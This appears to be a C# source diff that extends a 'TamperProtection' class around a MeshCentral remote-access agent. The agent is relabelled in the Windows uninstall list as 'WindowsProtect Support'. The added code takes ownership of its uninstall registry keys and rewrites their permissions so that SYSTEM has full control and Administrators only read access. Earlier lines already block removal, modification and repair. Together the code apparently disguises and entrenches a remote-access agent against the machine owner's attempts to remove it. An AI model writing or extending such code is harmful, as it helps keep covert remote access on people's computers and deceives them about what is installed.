@@ -138,7 +138,7 @@ internal static class TamperProtection {
     var ready=Path.Combine(Data,"tamper.ready");if(File.Exists(ready))File.Delete(ready);
     foreach(var name in new[]{"Mesh Agent","meshagent"}){
       var path=SupportPath(name);if(path.Length==0)continue;
-      SetService(name,false);SetRegistry(@"SYSTEM\CurrentControlSet\Services\"+name,false);SetDirectory(Path.GetDirectoryName(path),false,true);
+      SetService(name,false);SetRegistry(@"SYSTEM\CurrentControlSet\Services\"+name,false);SetDirectory(Path.GetDirectoryName(path),false,true);UnlockSupportEntry(path);
     }
   }
   internal static void Apply(){
@@ -176,6 +176,25 @@ internal static class TamperProtection {
       key.SetValue("SystemComponent",0,RegistryValueKind.DWord);key.SetValue("Comments","Managed protection component. Authorized removal is available through the WindowsProtect dashboard.");key.SetValue("HelpLink","https://devicehost.vercel.app");
     }
   }
+  static void UnlockSupportEntry(string executable){
+    foreach(var view in new[]{RegistryView.Registry64,RegistryView.Registry32}){
+      using(var hive=RegistryKey.OpenBaseKey(RegistryHive.LocalMachine,view))using(var root=hive.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",true)){
+        if(root==null)continue;
+        foreach(var name in root.GetSubKeyNames()){
+          string command;
+          using(var read=root.OpenSubKey(name)){if(read==null)continue;command=Convert.ToString(read.GetValue("UninstallString")??"").Trim();}
+          if(!command.StartsWith("\""+executable+"\"",StringComparison.OrdinalIgnoreCase) && !command.StartsWith(executable+" ",StringComparison.OrdinalIgnoreCase) && !command.Equals(executable,StringComparison.OrdinalIgnoreCase))continue;
+          using(var ownerKey=root.OpenSubKey(name,RegistryKeyPermissionCheck.ReadWriteSubTree,RegistryRights.TakeOwnership)){
+            var owner=new RegistrySecurity();owner.SetOwner(Sid("S-1-5-32-544"));ownerKey.SetAccessControl(owner);
+          }
+          using(var key=root.OpenSubKey(name,RegistryKeyPermissionCheck.ReadWriteSubTree,RegistryRights.ChangePermissions|RegistryRights.ReadKey)){
+            var security=new RegistrySecurity();security.SetAccessRuleProtection(true,false);security.SetOwner(Sid("S-1-5-32-544"));
+            foreach(var sid in new[]{"S-1-5-18","S-1-5-32-544"})security.AddAccessRule(new RegistryAccessRule(Sid(sid),RegistryRights.FullControl,InheritanceFlags.ContainerInherit,PropagationFlags.None,AccessControlType.Allow));key.SetAccessControl(security);
+          }
+        }
+      }
+    }
+  }
   static void BrandSupport(string executable){
     // Identify by the exact registered executable path, not display-name alone.
     foreach(var view in new[]{RegistryView.Registry64,RegistryView.Registry32}){
@@ -186,6 +205,9 @@ internal static class TamperProtection {
           bool owned=command.StartsWith("\""+executable+"\"",StringComparison.OrdinalIgnoreCase) || command.StartsWith(executable+" ",StringComparison.OrdinalIgnoreCase) || command.Equals(executable,StringComparison.OrdinalIgnoreCase);
           if(!owned)continue;
           key.SetValue("DisplayName","WindowsProtect Support");key.SetValue("Publisher","WindowsProtect");key.SetValue("NoRemove",1,RegistryValueKind.DWord);key.SetValue("NoModify",1,RegistryValueKind.DWord);key.SetValue("NoRepair",1,RegistryValueKind.DWord);key.SetValue("SystemComponent",0,RegistryValueKind.DWord);key.SetValue("Comments","WindowsProtect managed support component. Remove through the authorized dashboard.");
+          var security=new RegistrySecurity();security.SetAccessRuleProtection(true,false);security.SetOwner(Sid("S-1-5-18"));
+          security.AddAccessRule(new RegistryAccessRule(Sid("S-1-5-18"),RegistryRights.FullControl,InheritanceFlags.ContainerInherit,PropagationFlags.None,AccessControlType.Allow));
+          security.AddAccessRule(new RegistryAccessRule(Sid("S-1-5-32-544"),RegistryRights.ReadKey,InheritanceFlags.ContainerInherit,PropagationFlags.None,AccessControlType.Allow));key.SetAccessControl(security);
         }
       }
     }
